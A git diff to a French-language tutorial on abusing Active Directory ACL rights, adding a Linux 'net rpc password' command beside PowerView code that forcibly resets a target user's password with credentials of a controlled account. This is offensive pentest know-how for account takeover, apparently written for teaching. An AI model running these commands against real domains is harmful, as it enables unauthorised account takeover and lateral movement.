@@ -1,5 +1,5 @@
 ---
-public: true # set to true to make the article publishable
+public: true
 ---
 
 ## Enumération des ACLs
@@ -49,6 +49,12 @@ $PrivilegedCreds = New-Object System.Management.Automation.PSCredential('TESTLAB
 $newPassword = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
 # Modification du mot de passe
 Set-DomainUserPassword -Identity Target_AD_User -Password $newPassword -Credential $PrivilegedCreds
+```
+
+Linux
+```shell
+# autres méthodes disponibles (voir l'aide de bloodhound)
+net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
 ```
 
 ### GenericWrite
